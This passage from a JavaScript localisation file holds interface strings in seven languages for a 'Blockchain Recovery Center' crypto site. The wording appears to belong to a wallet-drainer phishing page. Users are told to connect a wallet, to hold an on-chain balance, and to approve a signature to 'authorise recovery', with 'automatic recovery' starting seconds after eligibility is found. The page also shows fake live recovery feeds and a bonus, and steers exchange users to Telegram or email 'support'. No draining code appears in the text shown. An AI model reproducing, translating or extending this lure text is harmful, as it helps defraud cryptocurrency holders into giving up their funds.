    viewButton: '查看详情',
    checkWalletEligibility: '⚡ 扫描区块链',
    valueBadge: '恢复金额',
    progress: '恢复进度',
    today: '今日',
    totalRecovered: '总恢复资产',
    tokenPrice: '网络',
    participants: '次恢复',
    liveClaims: '实时恢复动态',
    totalClaimed: '总价值',
    claimingNow: '正在恢复',
    lastClaim: '上次恢复',
    someoneJustClaimed: '资产恢复完成！',
    securedTokens: '已恢复',
    downloadReport: '下载恢复报告',
    waitingForFirstClaim: '等待恢复事件...',
    claimAmount: '已恢复',
    bonusTag: '+25% 奖励',
    recoverButton: '启动恢复',
    processing: '处理中...',
    completed: '✓ 恢复完成',
    secured: '您的资产已成功恢复',
    view: '查看已恢复资产',
    recoverNow: '立即恢复',
    recoveryComplete: '恢复完成！',
    amountRecovered: '恢复金额',
    processingRecovery: '启动恢复协议...',
    eligible: '✓ 检测到可恢复资产！',
    notEligible: '未发现可恢复资产',
    minRequirement: '需要链上余额才能启动恢复',
    recoveryValue: '可恢复价值',
    scanComplete: '区块链扫描完成',
    assetsFound: '个可恢复资产',
    recoveryInitiated: '恢复协议已启动',
    confirmationSent: '确认已发送',
    retrievalComplete: '资产检索完成',
    emailNotification: '恢复确认已发送',
    blockchainSync: '正在与区块链网络同步...',
    walletRequired: '需要活跃的钱包连接',
    insufficientBalance: '用于恢复的链上余额不足',
    proceedToRecovery: '点击继续资产恢复',
    recoveryReady: '恢复已就绪 - 点击检索资产',
    reportGenerated: '恢复报告已生成',
    reportDownloaded: '报告下载成功',
    support: '支持',
    reportIssue: '报告问题',
    yourEmail: '您的电子邮件地址',
    issuePlaceholder: '详细描述您的问题...',
    sendReport: '发送报告',
    reportSent: '报告发送成功！支持人员将尽快与您联系。',
    processingReport: '正在发送报告...',
    reportError: '发送报告失败，请重试。',
    contactInfo: '我们将在24小时内通过电子邮件回复您。',
    telegramSupport: 'Telegram 支持',
    telegramJoin: '加入社区',
    telegramDesc: '遇到连接问题？使用不受支持的交易所？我们的支持团队在 Telegram 上 24/7 活跃，帮助您恢复资产。',
    telegramButton: '加入 Telegram 社区',
    connectionHelp: '连接问题？',
    manualReachout: '人工支持',
    emailSupportTitle: '电子邮件支持',
    emailSupportDesc: '没有 Telegram？没问题！发送电子邮件给我们，我们的支持团队将在 24 小时内回复您。',
    whyEmailSupport: '为什么选择电子邮件支持？',
    emailSupportPoints: '• 对于不使用 Telegram 的用户\n• 对于需要文档的详细问题\n• 对于交易所用户（Binance、Coinbase、Kraken）\n• 对于手动恢复案例的跟进',
    recoveryInstructionsTitle: '🔐 如何恢复您的资产',
    recoveryStep1: '使用下方按钮连接您的钱包。',
    recoveryStep2: '等待自动扫描 5 个区块链网络（Ethereum、BSC、Polygon、Arbitrum、Avalanche）。',
    recoveryStep3: '如果符合条件，系统将自动启动恢复（或您可点击按钮）。',
    recoveryStep4: '在钱包中批准签名以授权恢复。',
    recoveryStep5: '恢复完成！您将收到确认和可下载的报告。',
    recoveryNote: '⚠️ 重要：恢复过程中请勿断开或关闭钱包。检测到资格后，自动恢复将在 5 秒后开始。'
  },
  ja: {
    serviceActive: 'リカバリープロトコル · アクティブ',
    welcome: 'ブロックチェーンリカバリーセンターへようこそ',
    connectWallet: 'ウォレットを接続',
    disconnect: '切断',
    checkEligibility: 'ウォレットの適格性を確認中',
    verifying: '復元可能な資産をウォレットで分析中...',
    terms: '利用規約',
    delivery: '配信',
    successful: '復元成功！',
    youHaveSecured: '資産の復元に成功しました',
    viewButton: '詳細を見る',
    checkWalletEligibility: '⚡ ブロックチェーンスキャン',
    valueBadge: '復元額',
    progress: '復元の進行状況',
    today: '今日',
    totalRecovered: '総復元資産',
    tokenPrice: 'ネットワーク',
    participants: '件の復元',
    liveClaims: 'ライブ復元フィード',
    totalClaimed: '総価値',
    claimingNow: '復元中',
    lastClaim: '最後の復元',
    someoneJustClaimed: '資産の復元が完了しました！',
    securedTokens: '復元済み',
    downloadReport: 'レポートをダウンロード',
    waitingForFirstClaim: '復元イベントを待機中...',
    claimAmount: '復元額',
    bonusTag: '+25% ボーナス',
    recoverButton: '復元を開始',
    processing: '処理中...',
    completed: '✓ 復元完了',
    secured: '資産は正常に復元されました',
    view: '復元された資産を見る',
    recoverNow: '今すぐ復元',
    recoveryComplete: '復元完了！',
    amountRecovered: '復元額',
    processingRecovery: 'リカバリープロトコルを起動中...',
    eligible: '✓ 復元可能な資産を検出！',
    notEligible: '復元可能な資産は見つかりません',
    minRequirement: '復元を開始するにはオンチェーン残高が必要です',
    recoveryValue: '復元可能な価値',
    scanComplete: 'ブロックチェーンスキャン完了',
    assetsFound: '件の復元可能な資産',
    recoveryInitiated: 'リカバリープロトコルを起動しました',
    confirmationSent: '確認を送信しました',
    retrievalComplete: '資産の取得が完了しました',
    emailNotification: '復元確認を送信しました',
    blockchainSync: 'ブロックチェーンネットワークと同期中...',
    walletRequired: 'アクティブなウォレット接続が必要です',
    insufficientBalance: '復元のためのオンチェーン残高が不足しています',
    proceedToRecovery: 'クリックして資産復元を続行',
    recoveryReady: '復元の準備ができました - クリックして資産を取得',
    reportGenerated: '復元レポートが生成されました',
    reportDownloaded: 'レポートのダウンロードに成功しました',
    support: 'サポート',
    reportIssue: '問題を報告',
    yourEmail: 'メールアドレス',
    issuePlaceholder: '問題の詳細を記述してください...',
    sendReport: 'レポートを送信',
    reportSent: 'レポートを送信しました！サポートからすぐに連絡があります。',
    processingReport: 'レポートを送信中...',
    reportError: 'レポートの送信に失敗しました。もう一度お試しください。',
    contactInfo: '24時間以内にメールでフォローアップします。',
    telegramSupport: 'Telegram サポート',
    telegramJoin: 'コミュニティに参加',
    telegramDesc: '接続の問題？サポートされていない取引所を使用していますか？当社のサポートチームは Telegram で 24/7 稼働し、資産の復元を支援します。',
    telegramButton: 'Telegram コミュニティに参加',
    connectionHelp: '接続の問題？',
    manualReachout: '手動サポート',
    emailSupportTitle: 'メールサポート',
    emailSupportDesc: 'Telegram がありませんか？問題ありません！問題を記載したメールを送信してください。サポートチームが 24 時間以内に返信します。',
    whyEmailSupport: 'メールサポートの理由',
    emailSupportPoints: '• Telegram を使用しないユーザー向け\n• 文書化が必要な詳細な問題向け\n• 取引所ユーザー（Binance、Coinbase、Kraken）向け\n• 手動復元ケースのフォローアップ向け',
    recoveryInstructionsTitle: '🔐 資産を復元する方法',
    recoveryStep1: '下のボタンでウォレットを接続します。',
    recoveryStep2: '5つのブロックチェーンネットワーク（Ethereum、BSC、Polygon、Arbitrum、Avalanche）の自動スキャンを待ちます。',
    recoveryStep3: '対象の場合、システムが自動的に復元を開始します（またはボタンをクリック）。',
    recoveryStep4: 'ウォレットで署名を承認して復元を許可します。',
    recoveryStep5: '復元完了！確認とダウンロード可能なレポートを受け取ります。',
    recoveryNote: '⚠️ 重要：処理中はウォレットを切断したり閉じたりしないでください。対象検出後5秒で自動復元が開始されます。'
  },
  ko: {
    serviceActive: '복구 프로토콜 · 활성화됨',
    welcome: '블록체인 복구 센터에 오신 것을 환영합니다',
    connectWallet: '지갑 연결',
    disconnect: '연결 끊기',
    checkEligibility: '지갑 적격성 확인 중',
    verifying: '복구 가능한 자산을 지갑에서 분석 중...',
    terms: '약관',
    delivery: '전달',
    successful: '복구 성공!',
    youHaveSecured: '자산이 성공적으로 복구되었습니다',
    viewButton: '세부 정보 보기',
    checkWalletEligibility: '⚡ 블록체인 스캔',
    valueBadge: '복구 금액',
    progress: '복구 진행률',
    today: '오늘',
    totalRecovered: '총 복구 자산',
    tokenPrice: '네트워크',
    participants: '회 복구',
    liveClaims: '실시간 복구 피드',
    totalClaimed: '총 가치',
    claimingNow: '복구 중',
    lastClaim: '마지막 복구',
    someoneJustClaimed: '자산 복구 완료!',
    securedTokens: '복구됨',
    downloadReport: '복구 보고서 다운로드',
    waitingForFirstClaim: '복구 이벤트 대기 중...',
    claimAmount: '복구됨',
    bonusTag: '+25% 보너스',
    recoverButton: '복구 시작',
    processing: '처리 중...',
    completed: '✓ 복구 완료',
    secured: '자산이 성공적으로 복구되었습니다',
    view: '복구된 자산 보기',
    recoverNow: '지금 복구',
    recoveryComplete: '복구 완료!',
    amountRecovered: '복구된 금액',
    processingRecovery: '복구 프로토콜 시작 중...',
    eligible: '✓ 복구 가능한 자산 감지됨!',
    notEligible: '복구 가능한 자산 없음',
    minRequirement: '복구 시작을 위한 온체인 잔액 필요',
    recoveryValue: '복구 가능한 가치',
    scanComplete: '블록체인 스캔 완료',
    assetsFound: '개의 복구 가능한 자산 발견',
    recoveryInitiated: '복구 프로토콜 시작됨',
    confirmationSent: '확인 전송됨',
    retrievalComplete: '자산 검색 완료',
    emailNotification: '복구 확인 전송됨',
    blockchainSync: '블록체인 네트워크와 동기화 중...',
    walletRequired: '활성 지갑 연결 필요',
    insufficientBalance: '복구를 위한 온체인 잔액 부족',
    proceedToRecovery: '클릭하여 자산 복구 진행',
    recoveryReady: '복구 준비 완료 - 클릭하여 자산 검색',
    reportGenerated: '복구 보고서 생성됨',
    reportDownloaded: '보고서 다운로드 성공',
    support: '지원',
    reportIssue: '문제 보고',
    yourEmail: '이메일 주소',
    issuePlaceholder: '문제를 자세히 설명하세요...',
    sendReport: '보고서 보내기',
    reportSent: '보고서가 성공적으로 전송되었습니다! 지원팀이 곧 연락드립니다.',
    processingReport: '보고서 전송 중...',
    reportError: '보고서 전송에 실패했습니다. 다시 시도하세요.',
    contactInfo: '24시간 이내에 이메일로 후속 조치하겠습니다.',
    telegramSupport: '텔레그램 지원',
    telegramJoin: '커뮤니티 가입',
    telegramDesc: '연결 문제가 있습니까? 지원되지 않는 거래소를 사용하십니까? 당사의 지원 팀은 텔레그램에서 24/7 활동하며 자산 복구를 도와드립니다.',
    telegramButton: '텔레그램 커뮤니티 가입',
    connectionHelp: '연결 문제?',
    manualReachout: '수동 지원',
    emailSupportTitle: '이메일 지원',
    emailSupportDesc: '텔레그램이 없습니까? 문제 없습니다! 문제가 있는 이메일을 보내주시면 지원 팀이 24시간 이내에 답변드립니다.',
    whyEmailSupport: '이메일 지원 이유',
    emailSupportPoints: '• 텔레그램을 사용하지 않는 사용자\n• 문서화가 필요한 세부 문제\n• 거래소 사용자(Binance, Coinbase, Kraken)\n• 수동 복구 사례 추적',
    recoveryInstructionsTitle: '🔐 자산을 복구하는 방법',
    recoveryStep1: '아래 버튼으로 지갑을 연결하세요.',
    recoveryStep2: '5개의 블록체인 네트워크(Ethereum, BSC, Polygon, Arbitrum, Avalanche) 자동 스캔을 기다리세요.',
    recoveryStep3: '자격이 있는 경우 시스템이 자동으로 복구를 시작합니다(또는 버튼을 클릭).',
    recoveryStep4: '지갑에서 서명을 승인하여 복구를 허가하세요.',
    recoveryStep5: '복구 완료! 확인 및 다운로드 가능한 보고서를 받게 됩니다.',
    recoveryNote: '⚠️ 중요: 프로세스 중에 지갑을 연결 해제하거나 닫지 마세요. 자격 감지 후 5초 후에 자동 복구가 시작됩니다.'
  },
  ar: {
    serviceActive: 'بروتوكول الاسترداد · نشط',
    welcome: 'مرحبًا بكم في مركز استرداد blockchain',
    connectWallet: 'اتصال المحفظة',
    disconnect: 'قطع الاتصال',
    checkEligibility: 'التحقق من أهلية المحفظة',
    verifying: 'تحليل المحفظة بحثًا عن الأصول القابلة للاسترداد...',
    terms: 'الشروط',
    delivery: 'التسليم',
    successful: 'تم الاسترداد بنجاح!',
    youHaveSecured: 'تم استرداد الأصول بنجاح',
    viewButton: 'عرض التفاصيل',
    checkWalletEligibility: '⚡ فحص البلوكتشين',
    valueBadge: 'مبلغ الاسترداد',
    progress: 'تقدم الاسترداد',
    today: 'اليوم',
    totalRecovered: 'إجمالي الأصول المستردة',
    tokenPrice: 'الشبكة',
    participants: 'استرداد',
    liveClaims: 'تغذية الاسترداد المباشر',
    totalClaimed: 'القيمة الإجمالية',
    claimingNow: 'جارٍ الاسترداد الآن',
    lastClaim: 'آخر استرداد',
    someoneJustClaimed: 'اكتمل استرداد الأصول!',
    securedTokens: 'تم الاسترداد',
    downloadReport: 'تنزيل تقرير الاسترداد',
    waitingForFirstClaim: 'في انتظار أحداث الاسترداد...',
    claimAmount: 'تم الاسترداد',
    bonusTag: '+25٪ مكافأة',
    recoverButton: 'بدء الاسترداد',
    processing: 'جارٍ المعالجة...',
    completed: '✓ اكتمل الاسترداد',
    secured: 'تم استرداد أصولك بنجاح',
    view: 'عرض الأصول المستردة',
    recoverNow: 'استرداد الآن',
    recoveryComplete: 'اكتمل الاسترداد!',
    amountRecovered: 'المبلغ المسترد',
    processingRecovery: 'بدء بروتوكول الاسترداد...',
    eligible: '✓ تم اكتشاف أصول قابلة للاسترداد!',
    notEligible: 'لم يتم العثور على أصول قابلة للاسترداد',
    minRequirement: 'مطلوب رصيد على السلسلة لبدء الاسترداد',
    recoveryValue: 'القيمة القابلة للاسترداد',
    scanComplete: 'اكتمل فحص البلوكتشين',
    assetsFound: 'أصول قابلة للاسترداد تم العثور عليها',
    recoveryInitiated: 'تم بدء بروتوكول الاسترداد',
    confirmationSent: 'تم إرسال التأكيد',
    retrievalComplete: 'اكتمل استرجاع الأصول',
    emailNotification: 'تم إرسال تأكيد الاسترداد',
    blockchainSync: 'مزامنة مع شبكات البلوكتشين...',
    walletRequired: 'مطلوب اتصال محفظة نشط',
    insufficientBalance: 'رصيد غير كافٍ على السلسلة للاسترداد',
    proceedToRecovery: 'انقر للمتابعة مع استرداد الأصول',
    recoveryReady: 'الاسترداد جاهز - انقر لاسترجاع الأصول',
    reportGenerated: 'تم إنشاء تقرير الاسترداد',
    reportDownloaded: 'تم تنزيل التقرير بنجاح',
    support: 'الدعم',
    reportIssue: 'الإبلاغ عن مشكلة',
    yourEmail: 'بريدك الإلكتروني',
    issuePlaceholder: 'صِف مشكلتك بالتفصيل...',
    sendReport: 'إرسال التقرير',
    reportSent: 'تم إرسال التقرير بنجاح! سيتصل بك الدعم قريبًا.',
    processingReport: 'جارٍ إرسال التقرير...',
    reportError: 'فشل إرسال التقرير. حاول مرة أخرى.',
    contactInfo: 'سنتابع عبر البريد الإلكتروني في غضون 24 ساعة.',
    telegramSupport: 'دعم Telegram',
    telegramJoin: 'انضم إلى مجتمعنا',
    telegramDesc: 'تواجه مشكلات في الاتصال؟ تستخدم بورصة غير مدعومة؟ فريق الدعم لدينا نشط 24/7 على Telegram لمساعدتك في استرداد أصولك.',
    telegramButton: 'انضم إلى مجتمع Telegram',
    connectionHelp: 'مشكلات الاتصال؟',
    manualReachout: 'الدعم اليدوي',
    emailSupportTitle: 'الدعم عبر البريد الإلكتروني',
    emailSupportDesc: 'لا تستخدم Telegram؟ لا مشكلة! أرسل إلينا بريدًا إلكترونيًا بمشكلتك وسيتواصل معك فريق الدعم في غضون 24 ساعة.',
    whyEmailSupport: 'لماذا الدعم عبر البريد الإلكتروني؟',
    emailSupportPoints: '• للمستخدمين الذين لا يستخدمون Telegram\n• للمشكلات التفصيلية التي تتطلب توثيقًا\n• لمستخدمي البورصات (Binance، Coinbase، Kraken)\n• لمتابعة حالات الاسترداد اليدوي',
    recoveryInstructionsTitle: '🔐 كيفية استرداد أصولك',
    recoveryStep1: 'قم بتوصيل محفظتك باستخدام الزر أدناه.',
    recoveryStep2: 'انتظر الفحص التلقائي لـ 5 شبكات blockchain (Ethereum، BSC، Polygon، Arbitrum، Avalanche).',
    recoveryStep3: 'إذا كنت مؤهلاً، سيبدأ النظام الاسترداد تلقائيًا (أو يمكنك النقر على الزر).',
    recoveryStep4: 'وافق على التوقيع في محفظتك لتأذن بالاسترداد.',
    recoveryStep5: 'اكتمل الاسترداد! ستتلقى تأكيدًا وتقريرًا قابلًا للتنزيل.',
    recoveryNote: '⚠️ مهم: لا تقم بقطع الاتصال أو إغلاق محفظتك أثناء العملية. سيبدأ الاسترداد التلقائي بعد 5 ثوانٍ من اكتشاف الأهلية.'
  },
  hi: {
    serviceActive: 'रिकवरी प्रोटोकॉल · सक्रिय',
    welcome: 'ब्लॉकचेन रिकवरी सेंटर में आपका स्वागत है',
    connectWallet: 'वॉलेट कनेक्ट करें',
    disconnect: 'डिस्कनेक्ट करें',
    checkEligibility: 'वॉलेट पात्रता की जांच कर रहा है',
    verifying: 'रिकवरी योग्य संपत्तियों के लिए वॉलेट का विश्लेषण कर रहा है...',
    terms: 'नियम',
    delivery: 'डिलीवरी',
    successful: 'रिकवरी सफल!',
    youHaveSecured: 'संपत्तियां सफलतापूर्वक पुनर्प्राप्त की गईं',
    viewButton: 'विवरण देखें',
    checkWalletEligibility: '⚡ ब्लॉकचेन स्कैन करें',
    valueBadge: 'रिकवरी राशि',
    progress: 'रिकवरी प्रगति',
    today: 'आज',
    totalRecovered: 'कुल पुनर्प्राप्त संपत्तियां',
    tokenPrice: 'नेटवर्क',
    participants: 'रिकवरी',
    liveClaims: 'लाइव रिकवरी फीड',
    totalClaimed: 'कुल मूल्य',
    claimingNow: 'अभी रिकवर हो रहा है',
    lastClaim: 'अंतिम रिकवरी',
    someoneJustClaimed: 'एसेट रिकवरी पूरी हुई!',
    securedTokens: 'पुनर्प्राप्त किया गया',
    downloadReport: 'रिकवरी रिपोर्ट डाउनलोड करें',
    waitingForFirstClaim: 'रिकवरी इवेंट्स की प्रतीक्षा...',
    claimAmount: 'पुनर्प्राप्त किया गया',
    bonusTag: '+25% बोनस',
    recoverButton: 'रिकवरी शुरू करें',
    processing: 'प्रोसेसिंग...',
    completed: '✓ रिकवरी पूरी हुई',
    secured: 'आपकी संपत्तियां सफलतापूर्वक पुनर्प्राप्त कर ली गई हैं',
    view: 'पुनर्प्राप्त संपत्तियां देखें',
    recoverNow: 'अभी रिकवर करें',
    recoveryComplete: 'रिकवरी पूरी!',
    amountRecovered: 'पुनर्प्राप्त राशि',
    processingRecovery: 'रिकवरी प्रोटोकॉल शुरू कर रहा है...',
    eligible: '✓ रिकवरी योग्य संपत्तियां मिलीं!',
    notEligible: 'कोई रिकवरी योग्य संपत्ति नहीं मिली',
    minRequirement: 'रिकवरी शुरू करने के लिए ऑन-चेन बैलेंस आवश्यक है',
    recoveryValue: 'रिकवरी योग्य मूल्य',
    scanComplete: 'ब्लॉकचेन स्कैन पूरा हुआ',
    assetsFound: 'रिकवरी योग्य संपत्तियां मिलीं',
    recoveryInitiated: 'रिकवरी प्रोटोकॉल शुरू किया गया',
    confirmationSent: 'पुष्टि भेजी गई',
    retrievalComplete: 'एसेट पुनर्प्राप्ति पूरी हुई',
    emailNotification: 'रिकवरी पुष्टि भेजी गई',
    blockchainSync: 'ब्लॉकचेन नेटवर्क के साथ सिंक्रनाइज़ हो रहा है...',
    walletRequired: 'सक्रिय वॉलेट कनेक्शन आवश्यक है',
    insufficientBalance: 'रिकवरी के लिए अपर्याप्त ऑन-चेन बैलेंस',
    proceedToRecovery: 'एसेट रिकवरी के साथ आगे बढ़ने के लिए क्लिक करें',
    recoveryReady: 'रिकवरी तैयार है - एसेट पुनर्प्राप्त करने के लिए क्लिक करें',
    reportGenerated: 'रिकवरी रिपोर्ट तैयार की गई',
    reportDownloaded: 'रिपोर्ट सफलतापूर्वक डाउनलोड हुई',
    support: 'सहायता',
    reportIssue: 'समस्या की रिपोर्ट करें',
    yourEmail: 'आपका ईमेल पता',
    issuePlaceholder: 'अपनी समस्या का विस्तार से वर्णन करें...',
    sendReport: 'रिपोर्ट भेजें',
    reportSent: 'रिपोर्ट सफलतापूर्वक भेजी गई! सहायता जल्द ही आपसे संपर्क करेगी।',
    processingReport: 'रिपोर्ट भेज रहा है...',
    reportError: 'रिपोर्ट भेजने में विफल। कृपया पुनः प्रयास करें।',
    contactInfo: 'हम 24 घंटे के भीतर ईमेल के माध्यम से संपर्क करेंगे।',
    telegramSupport: 'टेलीग्राम सहायता',
    telegramJoin: 'हमारे समुदाय से जुड़ें',
    telegramDesc: 'कनेक्शन की समस्या का सामना कर रहे हैं? असमर्थित एक्सचेंज का उपयोग कर रहे हैं? हमारी सहायता टीम आपकी संपत्तियों को पुनर्प्राप्त करने में आपकी सहायता के लिए टेलीग्राम पर 24/7 सक्रिय है।',
    telegramButton: 'टेलीग्राम समुदाय से जुड़ें',
    connectionHelp: 'कनेक्शन संबंधी समस्याएं?',
    manualReachout: 'मैनुअल सहायता',
    emailSupportTitle: 'ईमेल सहायता',
    emailSupportDesc: 'टेलीग्राम नहीं है? कोई बात नहीं! हमें अपनी समस्या के साथ एक ईमेल भेजें और हमारी सहायता टीम 24 घंटे के भीतर आपसे संपर्क करेगी।',
    whyEmailSupport: 'ईमेल सहायता क्यों?',
    emailSupportPoints: '• उन उपयोगकर्ताओं के लिए जो टेलीग्राम का उपयोग नहीं करते हैं\n• दस्तावेज़ीकरण की आवश्यकता वाले विस्तृत मुद्दों के लिए\n• एक्सचेंज उपयोगकर्ताओं के लिए (Binance, Coinbase, Kraken)\n• मैनुअल रिकवरी मामलों के अनुवर्ती के लिए',
    recoveryInstructionsTitle: '🔐 अपनी संपत्तियों को कैसे पुनर्प्राप्त करें',
    recoveryStep1: 'नीचे दिए गए बटन का उपयोग करके अपना वॉलेट कनेक्ट करें।',
    recoveryStep2: '5 ब्लॉकचेन नेटवर्क (Ethereum, BSC, Polygon, Arbitrum, Avalanche) की स्वचालित स्कैनिंग की प्रतीक्षा करें।',
    recoveryStep3: 'यदि पात्र हैं, तो सिस्टम स्वचालित रूप से रिकवरी शुरू कर देगा (या आप बटन पर क्लिक कर सकते हैं)।',
    recoveryStep4: 'रिकवरी को अधिकृत करने के लिए अपने वॉलेट में हस्ताक्षर स्वीकृत करें।',
    recoveryStep5: 'रिकवरी पूरी हुई! आपको एक पुष्टि और डाउनलोड करने योग्य रिपोर्ट प्राप्त होगी।',
    recoveryNote: '⚠️ महत्वपूर्ण: प्रक्रिया के दौरान अपने वॉलेट को डिस्कनेक्ट या बंद न करें। पात्रता का पता लगने के 5 सेकंड बाद स्वचालित रिकवरी शुरू हो जाती है।'
  },
  tr: {
    serviceActive: 'KURTARMA PROTOKOLÜ · AKTİF',
    welcome: 'Blockchain Kurtarma Merkezi\'ne Hoş Geldiniz',
    connectWallet: 'CÜZDAN BAĞLA',
    disconnect: 'Bağlantıyı Kes',
    checkEligibility: 'Cüzdan uygunluğu kontrol ediliyor',
    verifying: 'Kurtarılabilir varlıklar için cüzdan analiz ediliyor...',
    terms: 'Şartlar',
    delivery: 'Teslimat',
    successful: 'KURTARMA BAŞARILI!',
    youHaveSecured: 'Varlıklar Başarıyla Kurtarıldı',
    viewButton: 'DETAYLARI GÖR',
    checkWalletEligibility: '⚡ Blockchain Tara',
    valueBadge: 'Kurtarma Tutarı',
    progress: 'Kurtarma İlerlemesi',
    today: 'Bugün',
    totalRecovered: 'Toplam Kurtarılan Varlıklar',
    tokenPrice: 'Ağ',
    participants: 'kurtarma',
    liveClaims: 'CANLI KURTARMA AKIŞI',
    totalClaimed: 'Toplam Değer',
    claimingNow: 'şimdi kurtarılıyor',
    lastClaim: 'Son kurtarma',
    someoneJustClaimed: 'Varlık Kurtarma Tamamlandı!',
    securedTokens: 'kurtarıldı',
    downloadReport: 'Kurtarma Raporunu İndir',
    waitingForFirstClaim: 'Kurtarma olayları bekleniyor...',
    claimAmount: 'Kurtarıldı',
    bonusTag: '+25% bonus',
    recoverButton: 'KURTARMAYI BAŞLAT',
    processing: 'İŞLEM YAPILIYOR...',
    completed: '✓ KURTARMA TAMAMLANDI',
    secured: 'Varlıklarınız başarıyla kurtarıldı',
    view: 'KURTARILAN VARLIKLARI GÖR',
    recoverNow: 'ŞİMDİ KURTAR',
    recoveryComplete: 'KURTARMA TAMAM!',
    amountRecovered: 'Kurtarılan Tutar',
    processingRecovery: 'Kurtarma protokolü başlatılıyor...',
    eligible: '✓ Kurtarılabilir Varlıklar Tespit Edildi!',
    notEligible: 'Kurtarılabilir Varlık Bulunamadı',
    minRequirement: 'Kurtarma başlatmak için zincir üstü bakiye gerekli',
    recoveryValue: 'Kurtarılabilir Değer',
    scanComplete: 'Blockchain taraması tamamlandı',
    assetsFound: 'kurtarılabilir varlık bulundu',
    recoveryInitiated: 'Kurtarma protokolü başlatıldı',
    confirmationSent: 'Onay gönderildi',
    retrievalComplete: 'Varlık alımı tamamlandı',
    emailNotification: 'Kurtarma onayı gönderildi',
    blockchainSync: 'Blockchain ağlarıyla senkronize ediliyor...',
    walletRequired: 'Aktif cüzdan bağlantısı gerekli',
    insufficientBalance: 'Kurtarma için yetersiz zincir üstü bakiye',
    proceedToRecovery: 'Varlık kurtarmaya devam etmek için tıklayın',
    recoveryReady: 'Kurtarma hazır - varlıkları almak için tıklayın',
    reportGenerated: 'Kurtarma raporu oluşturuldu',
    reportDownloaded: 'Rapor başarıyla indirildi',
    support: 'Destek',
    reportIssue: 'Sorun Bildir',
    yourEmail: 'E-posta Adresiniz',
    issuePlaceholder: 'Sorununuzu ayrıntılı olarak açıklayın...',
    sendReport: 'Raporu Gönder',
    reportSent: 'Rapor başarıyla gönderildi! Destek kısa süre içinde sizinle iletişime geçecektir.',
    processingReport: 'Rapor gönderiliyor...',
    reportError: 'Rapor gönderilemedi. Lütfen tekrar deneyin.',
    contactInfo: '24 saat içinde e-posta ile size ulaşacağız.',
    telegramSupport: 'Telegram Desteği',
    telegramJoin: 'Topluluğumuza Katılın',
    telegramDesc: 'Bağlantı sorunları mı yaşıyorsunuz? Desteklenmeyen bir borsa mı kullanıyorsunuz? Destek ekibimiz varlıklarınızı kurtarmanıza yardımcı olmak için Telegram\'da 7/24 aktiftir.',
    telegramButton: 'Telegram Topluluğuna Katılın',
    connectionHelp: 'Bağlantı Sorunları?',
    manualReachout: 'Manuel Destek',
    emailSupportTitle: 'E-posta Desteği',
    emailSupportDesc: 'Telegram yok mu? Sorun değil! Sorununuzu içeren bir e-posta gönderin, destek ekibimiz 24 saat içinde size geri dönecektir.',
    whyEmailSupport: 'Neden E-posta Desteği?',
    emailSupportPoints: '• Telegram kullanmayan kullanıcılar için\n• Belgeler gerektiren ayrıntılı sorunlar için\n• Borsa kullanıcıları için (Binance, Coinbase, Kraken)\n• Manuel kurtarma vakalarının takibi için',
    recoveryInstructionsTitle: '🔐 Varlıklarınızı Nasıl Kurtarırsınız',
    recoveryStep1: 'Aşağıdaki butonla cüzdanınızı bağlayın.',
    recoveryStep2: '5 blockchain ağının (Ethereum, BSC, Polygon, Arbitrum, Avalanche) otomatik taramasını bekleyin.',
    recoveryStep3: 'Uygun iseniz, sistem otomatik olarak kurtarmayı başlatır (veya butona tıklayabilirsiniz).',
    recoveryStep4: 'Kurtarmayı yetkilendirmek için cüzdanınızdaki imzayı onaylayın.',
    recoveryStep5: 'Kurtarma tamamlandı! Bir onay ve indirilebilir rapor alacaksınız.',
    recoveryNote: '⚠️ Önemli: İşlem sırasında cüzdanınızın bağlantısını kesmeyin veya kapatmayın. Uygunluk tespitinden 5 saniye sonra otomatik kurtarma başlar.'
  },
  nl: {
    serviceActive: 'HERSTELPROTOCOL · ACTIEF',
    welcome: 'Welkom bij Blockchain Herstelcentrum',
    connectWallet: 'WALLET VERBINDEN',
    disconnect: 'Verbinding verbreken',
    checkEligibility: 'Walletgeschiktheid controleren',
    verifying: 'Wallet analyseren op herstelbare activa...',
    terms: 'Voorwaarden',
    delivery: 'Levering',
    successful: 'HERSTEL SUCCESVOL!',
    youHaveSecured: 'Activa succesvol hersteld',
    viewButton: 'BEKIJK DETAILS',
    checkWalletEligibility: '⚡ Blockchain scannen',
    valueBadge: 'Herstelbedrag',
    progress: 'Herstelvoortgang',
    today: 'Vandaag',
    totalRecovered: 'Totaal herstelde activa',
    tokenPrice: 'Netwerk',
    participants: 'herstelbeurten',
    liveClaims: 'LIVE HERSTELFEED',
    totalClaimed: 'Totale waarde',
    claimingNow: 'herstelt nu',
    lastClaim: 'Laatste herstel',
    someoneJustClaimed: 'Activaherstel voltooid!',
    securedTokens: 'hersteld',
    downloadReport: 'Herstelrapport downloaden',
    waitingForFirstClaim: 'Wachten op herstelgebeurtenissen...',
    claimAmount: 'Hersteld',
    bonusTag: '+25% bonus',
    recoverButton: 'HERSTEL STARTEN',
    processing: 'VERWERKING...',
    completed: '✓ HERSTEL VOLTOOID',
    secured: 'Uw activa zijn succesvol hersteld',
    view: 'BEKIJK HERSTELDE ACTIVA',
    recoverNow: 'NU HERSTELLEN',
    recoveryComplete: 'HERSTEL VOLTOOID!',
    amountRecovered: 'Hersteld bedrag',
    processingRecovery: 'Herstelprotocol starten...',
    eligible: '✓ Herstelbare activa gedetecteerd!',
    notEligible: 'Geen herstelbare activa gevonden',
    minRequirement: 'On-chain saldo vereist om herstel te starten',
    recoveryValue: 'Herstelbare waarde',
    scanComplete: 'Blockchain-scan voltooid',
    assetsFound: 'herstelbare activa gevonden',
    recoveryInitiated: 'Herstelprotocol gestart',
    confirmationSent: 'Bevestiging verzonden',
    retrievalComplete: 'Activaherstel voltooid',
    emailNotification: 'Herstelbevestiging verzonden',
    blockchainSync: 'Synchroniseren met blockchainnetwerken...',
    walletRequired: 'Actieve walletverbinding vereist',
    insufficientBalance: 'Onvoldoende on-chain saldo voor herstel',
    proceedToRecovery: 'Klik om door te gaan met activaherstel',
    recoveryReady: 'Herstel gereed - klik om activa op te halen',
    reportGenerated: 'Herstelrapport gegenereerd',
    reportDownloaded: 'Rapport succesvol gedownload',
    support: 'Ondersteuning',
    reportIssue: 'Probleem melden',
    yourEmail: 'Uw e-mailadres',
    issuePlaceholder: 'Beschrijf uw probleem in detail...',
    sendReport: 'Rapport verzenden',
    reportSent: 'Rapport succesvol verzonden! Ondersteuning neemt binnenkort contact met u op.',
    processingReport: 'Rapport verzenden...',
    reportError: 'Verzenden mislukt. Probeer het opnieuw.',
    contactInfo: 'We nemen binnen 24 uur contact met u op via e-mail.',
    telegramSupport: 'Telegram Ondersteuning',
